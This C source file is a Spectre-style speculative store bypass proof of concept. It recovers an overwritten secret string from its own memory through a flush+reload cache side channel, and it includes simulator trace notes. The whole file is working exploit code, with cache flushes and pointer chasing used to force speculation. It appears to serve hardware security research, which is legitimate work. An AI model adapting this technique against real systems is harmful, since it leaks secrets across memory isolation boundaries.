#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"


// inaccessible (overwritten) secret
#define SECRET      "SEC"
#define OVERWRITE   '#'
#define CACHE_MISS 80

char* data;
char* mem;
int junk = 0;

/* 

  401927: 1280943, 1294439, 1307935
  -> 401930: 1280947, 1294443, 1307939
     401937: 1280949, 1294445, 1307941

  Found possible load violation at addr: 0x4a208 between instructions [sn:1355637] and [sn:1355643]
  0x401924 and 0x401930

  
*/

// ---------------------------------------------------------------------------



void access_array(int x) {
  int tmp;
  // store secret in data
  strcpy(data, SECRET);
  //printf("%s\n",data);
  //printf("ptr of contention location: %p\n", &data[x]);

  // flushing the data which is used in the condition increases
  // probability of speculation
  _mm_mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  char**** data_ultraslowptr = &data_slowslowptr;
  _mm_mfence();
  _mm_clflush(&x);
  _mm_clflush(data_slowptr);
  _mm_clflush(&data_slowptr);
  _mm_clflush(data_slowslowptr);
  _mm_clflush(&data_slowslowptr);
  _mm_clflush(data_ultraslowptr);
  _mm_clflush(&data_ultraslowptr);
  // ensure data is flushed at this point
  _mm_mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  //printf("%c", data[x]);
    (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
    tmp = *(mem + data[x]*4096);
  //maccess(mem + data[x]*4096);

  // data[x] should now be "#"
  // uncomment next line to break attack
  //_mm_mfence();
  // Encode stale value in the cache
  
  
}


int main(int argc, const char **argv) {
    int results[256];
    int j, k;
  data = malloc(128*sizeof(char));
  // Detect cache threshold
  
  int pagesize = 4096;

  mem = malloc(pagesize * 256);
  // initialize memory
  memset(mem, 1, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  flush(mem,pagesize);

  // nothing leaked so far
  //char * leaked = malloc(sizeof(SECRET) + 1);
  //memset(leaked, ' ', sizeof(SECRET) + 1);
  //leaked[sizeof(SECRET)] = 0;

  for (int z =0; z < 10; z++) {
      for (j = 0; j < 256; j++) {
          results[j] = 0;
      }
      // for every byte in the string
      _mm_mfence();

      // overwrite value with X, then access
      access_array(z % sizeof(SECRET));

      _mm_mfence(); // avoid speculation
      // Recover data from covert channel
      probe(mem, 80, pagesize, results);
      _mm_mfence();
      j = k = -1;
      for (int i = 0; i < 256; i++) {
          if (j < 0 || results[i] >= results[j]) {
              k = j;
              j = i;
          } else if (k < 0 || results[i] >= results[k]) {
              k = i;
          }
      }
      printf("j,results[j]: %c,%d\n",j,results[j]);
      printf("k,results[k]: %c,%d\n",k,results[k]);
  }

  /* if ((results[j] >= 2 * results[k] + 5) ||
      (results[j] == 2 && results[k] == 0)) {
      break;
  } */

  printf("%d\n",junk);

  //printf("%s", leaked);
  free(data);
  free(mem);
  //free(leaked);

  return 0;
}
